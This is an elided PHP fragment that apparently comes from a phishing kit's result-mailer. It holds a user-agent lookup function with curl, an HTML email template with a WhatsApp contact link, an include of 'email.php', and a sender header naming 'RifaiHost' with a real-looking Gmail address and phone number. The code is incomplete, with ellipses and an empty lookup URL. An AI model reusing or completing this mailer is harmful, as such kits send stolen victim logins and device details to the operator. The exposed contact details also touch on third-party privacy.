...
function devicemanager($ua){
    $ch = curl_init();  
    curl_setopt($ch, CURLOPT_URL, "".urlencode($ua)); 
...
$pesan = '
<center>
 <div style="background: url(https://b.top4top.io/p_2355o3bjy0.jpg) no-repeat;border:2px solid white;background-size: 100% 100%; width: 294; height: 101px; color: #000000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
...
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#00ff00;" href="https://wa.me/6282138726138">Whatsapp</a>
</div>
 <center>
';
include 'email.php';
$sender = 'From: Web P || RifaiHost <yumekodeveloper@gmail.com>';
